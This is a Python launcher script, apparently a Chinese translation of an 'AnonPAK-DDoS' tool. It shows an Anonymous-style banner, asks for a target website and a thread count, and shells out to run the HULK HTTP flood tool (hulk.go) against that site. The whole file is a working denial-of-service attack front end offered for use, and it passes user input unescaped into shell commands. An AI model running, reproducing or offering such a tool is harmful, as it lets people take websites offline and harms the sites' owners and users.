from colorama import Fore, Back, Style
#print(Fore.RED + 'some red text')
#print(Back.GREEN + 'and with a green background')
#print(Style.DIM + 'and in dim text')
#print(Style.RESET_ALL)
#print('back to normal now')
import os
import pyttsx3
import sys
import platform
def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()
print(Fore.GREEN + Back.BLACK)
if str(platform.system()) == 'Linux':
    os.system('figlet AnonymousPAK DDoS Attack')
else:
    os.system('pyfiglet AnonymousPAK  DDoS Attack')

print(Back.GREEN + Fore.GREEN +'[+] 匿名DDoS工具，制作者：' + Fore.RED + 'Anonymous Pakistan Community                              ') 
print(Back.GREEN + Fore.BLACK + '[+] AnonPAK-DDoS工具 测试版0.1                                             ')
print(Back.BLACK +Fore.GREEN + '[+] AnonPAK-DDoS 工具 Python互动菜单 制作者：Muneeb Khurram                         ')
print(Fore.YELLOW + '[+] 我们是一个匿名的军团，我们不会原谅，我们不会忘记                            ')
print(Fore.GREEN + '[+] 开始AnonPAK DoS工具，将1024个基线线程作为默认线程，根据需要进行以下更改           ')
print(Fore.BLUE + '作者：' + Fore.GREEN + 'Muneeb Khurram (UBISOFT-1)')
print(Fore.RED + '油管： ' + Fore.GREEN + 'https://www.youtube.com/channel/UCzYulTuhxSIqSlW2PqTkkEw')
print(Fore.YELLOW + 'GitHub：' + Fore.GREEN + 'https://github.com/ubisoft-1')
print(Fore.BLUE + '翻译者：' + Fore.GREEN + '宇涵（E-hydrogen）')
print(Fore.RED + '翻译者B站： ' + Fore.GREEN + 'https://space.bilibili.com/549633102')
print(Fore.YELLOW + '翻译者GitHub：' + Fore.GREEN + 'https://github.com/E-hydrogen')
print('你的系统'+ Fore.RED + str(platform.system())+Fore.GREEN)
try:
    threads = input('[+] 请输入DDoS的' + Fore.BLUE + '线程' + Fore.GREEN + '>>>')
    site = input(Fore.BLUE + '[+] 请输入你有' + Fore.RED + 'DDoS' + Fore.GREEN + '的网站>>>')
    colab_status = input(Fore.YELLOW + '你要使用Google Collab DDoS吗？[Y/N]')
    attack_severity = input('[+] 输入'+ Fore.RED +' 1'+Fore.GREEN+'一个很小的'+Fore.RED+'目标'+Fore.GREEN+'就比如一个装置' + Fore.YELLOW + ' 2 ' + Fore.GREEN +'一个' + Fore.YELLOW + '网站'+ Fore.GREEN + '>>>')
    if 'Y' == colab_status:
        print('好的，现在请不要使用文本到语音，让你的攻击看起来很' + Fore.RED+ '酷' + Fore.GREEN)
    if 'y' == colab_status:
        print('好的，现在请不要使用文本到语音，让你的攻击看起来很' + Fore.RED+ '酷' + Fore.GREEN)
    if 'n' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] 就像你在Linux上一样，不要使用文本到语音')
        else:
            say_stuff("使用{1}线程攻击目标网站{0}".format(site, threads))
    if 'N' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] 就像你在Linux上一样，不要使用文本到语音')
        else:
            say_stuff("使用{1}线程攻击目标网站{0}".format(site, threads))

    print('[+] 执行以下命令')
    print(Fore.GREEN +'HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
    if 'Windows' in str(platform.system()):
        os.system('go run hulk.go -site {0}'.format(site))
    else:
        os.system('HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
    print(Back.BLACK + Fore.GREEN)
    
except:
    print('[+] 执行已停止，错误代码为0，请安装GoLang，否则您的Internet无法正常工作')
    print('[+] 安装依赖项')
    os.system('python3 Install_Dependancies.py')
    os.system('python Install_Dependancies.py')
    os.system('py Install_Dependancies.py')
